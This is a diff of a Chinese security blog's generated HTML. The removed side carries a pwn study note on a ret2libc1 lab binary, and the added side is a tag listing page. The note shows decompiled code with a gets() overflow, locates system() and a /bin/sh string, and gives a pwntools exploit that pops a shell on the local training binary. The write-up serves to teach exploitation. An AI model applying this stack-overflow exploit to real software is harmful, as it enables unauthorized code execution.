@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="pwn,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -86,23 +86,13 @@
 
 
 
-<meta name="description" content="试着运行程序  程序只有一个输入点，检查程序  程序开启了NX，拖进ida查看 int __cdecl main(int argc, const char **argv, const char **envp) {   char s; // [esp+1Ch] [ebp-64h]    setvbuf(stdout, 0, 2, 0);   setvbuf(_bss_start, 0, 1, 0);">
-<meta name="keywords" content="pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习笔记-ret2libc1">
-<meta property="og:url" content="https://yml-sec.top/2019/01/22/pwn学习笔记-ret2libc1/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="yemoli&#39;s blog">
+<meta property="og:url" content="https://yml-sec.top/tags/转载文章/index.html">
 <meta property="og:site_name" content="yemoli&#39;s blog">
-<meta property="og:description" content="试着运行程序  程序只有一个输入点，检查程序  程序开启了NX，拖进ida查看 int __cdecl main(int argc, const char **argv, const char **envp) {   char s; // [esp+1Ch] [ebp-64h]    setvbuf(stdout, 0, 2, 0);   setvbuf(_bss_start, 0, 1, 0);">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://i.imgur.com/KHOhLNo.jpg">
-<meta property="og:image" content="https://i.imgur.com/Hsrnq7T.jpg">
-<meta property="og:image" content="https://i.imgur.com/rd1FRAC.jpg">
-<meta property="og:image" content="https://i.imgur.com/BKSl75K.jpg">
-<meta property="og:updated_time" content="2019-01-22T14:28:14.469Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习笔记-ret2libc1">
-<meta name="twitter:description" content="试着运行程序  程序只有一个输入点，检查程序  程序开启了NX，拖进ida查看 int __cdecl main(int argc, const char **argv, const char **envp) {   char s; // [esp+1Ch] [ebp-64h]    setvbuf(stdout, 0, 2, 0);   setvbuf(_bss_start, 0, 1, 0);">
-<meta name="twitter:image" content="https://i.imgur.com/KHOhLNo.jpg">
+<meta name="twitter:title" content="yemoli&#39;s blog">
 
 
 
@@ -132,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://yml-sec.top/2019/01/22/pwn学习笔记-ret2libc1/">
+  <link rel="canonical" href="https://yml-sec.top/tags/转载文章/">
 
 
 
 
 
-  <title>pwn学习笔记-ret2libc1 | yemoli's blog</title>
+  <title>Tag: 转载文章 | yemoli's blog</title>
   
 
 
@@ -157,7 +147,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left ">
     <div class="headband"></div>
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
@@ -250,258 +240,52 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-expand">
-    
+  
+  
+  
+  <div class="post-block tag">
 
-  
+    <div id="posts" class="posts-collapse">
+      <div class="collection-title">
+        <h1>转载文章<small>Tag</small>
+        </h1>
+      </div>
 
-  
-  
-  
+      
+        
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/01/22/pwn学习笔记-ret2libc1/">
+    <header class="post-header">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="夜莫离、">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="yemoli's blog">
-    </span>
-
-    
-      <header class="post-header">
-
+      <h2 class="post-title">
         
+            <a class="post-title-link" href="/2019/02/09/转载-PHP代码审计/" itemprop="url">
+              
+                <span itemprop="name">转载-PHP代码审计</span>
+              
+            </a>
         
-          <h1 class="post-title" itemprop="name headline">pwn学习笔记-ret2libc1</h1>
-        
+      </h2>
 
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-22T22:10:09+08:00">
-                2019-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  274
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <p>试着运行程序</p>
-<p><img src="https://i.imgur.com/KHOhLNo.jpg" alt=""></p>
-<p>程序只有一个输入点，检查程序</p>
-<p><img src="https://i.imgur.com/Hsrnq7T.jpg" alt=""></p>
-<p>程序开启了NX，拖进ida查看</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char s; // [esp+1Ch] [ebp-64h]
-
-  setvbuf(stdout, 0, 2, 0);
-  setvbuf(_bss_start, 0, 1, 0);
-  puts(&quot;RET2LIBC &gt;_&lt;&quot;);
-  gets(&amp;s);
-  return 0;
-}
-</code></pre><p>这里同样有gets函数，并且经检测需覆盖字符仍为112</p>
-<p>发现了内置的system函数</p>
-<pre><code>void secure()
-{
-  unsigned int v0; // eax
-  int input; // [esp+18h] [ebp-10h]
-  int secretcode; // [esp+1Ch] [ebp-Ch]
-
-  v0 = time(0);
-  srand(v0);
-  secretcode = rand();
-  __isoc99_scanf(&quot;%d&quot;, &amp;input);
-  if ( input == secretcode )
-     system(&quot;shell!?&quot;);
-}
-</code></pre><p>但是并没有/bin/sh ,接着在ida中寻找/bin/sh</p>
-<p><img src="https://i.imgur.com/rd1FRAC.jpg" alt=""></p>
-<p>可以看到在0x08048720处存在/bin/sh</p>
-<p>下面就可以构造exp了</p>
-<pre><code>from pwn import *
-
-p = process(&apos;./ret2libc1&apos;)
-
-elf = ELF(&apos;./ret2libc1&apos;)
-
-p.sendline(&apos;a&apos;*112+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(0x08048720))
-
-p.interactive()
-</code></pre><p>其中</p>
-<pre><code>&apos;a&apos;*112+p32(elf.plt[&apos;system&apos;])+&apos;aaaa&apos;+p32(0x08048720)
-</code></pre><p>这里的aaaa是执行system后的返回地址，因为执行完system后我们就获取了shell，所以返回地址就用不到了，可以随意写</p>
-<p><img src="https://i.imgur.com/BKSl75K.jpg" alt=""></p>
-<p>可以看到成功获得了shell</p>
-
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-      <div>
-        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
-  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
-  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
-    <span>Donate</span>
-  </button>
-  <div id="QR" style="display: none;">
-
-    
-      <div id="wechat" style="display: inline-block">
-        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="夜莫离、 WeChat Pay">
-        <p>WeChat Pay</p>
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated" datetime="2019-02-09T22:08:48+08:00" content="2019-02-09">
+          02-09
+        </time>
       </div>
-    
 
-    
-      <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="/images/alipay.jpg" alt="夜莫离、 Alipay">
-        <p>Alipay</p>
-      </div>
-    
-
-    
-
-  </div>
-</div>
-
-      </div>
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/01/21/pwn学习笔记-ret2text/" rel="next" title="pwn学习笔记-ret2text">
-                <i class="fa fa-chevron-left"></i> pwn学习笔记-ret2text
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/23/pwn学习笔记-ret2libc2/" rel="prev" title="pwn学习笔记-ret2libc2">
-                pwn学习笔记-ret2libc2 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+    </header>
   </article>
 
 
-
-    <div class="post-spread">
       
     </div>
+
   </div>
+  
+  
+  
+
+  
 
 
           </div>
@@ -509,10 +293,6 @@ p.interactive()
 
 
           
-
-  
-
-
 
         </div>
         
@@ -749,10 +529,6 @@ p.interactive()
   
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
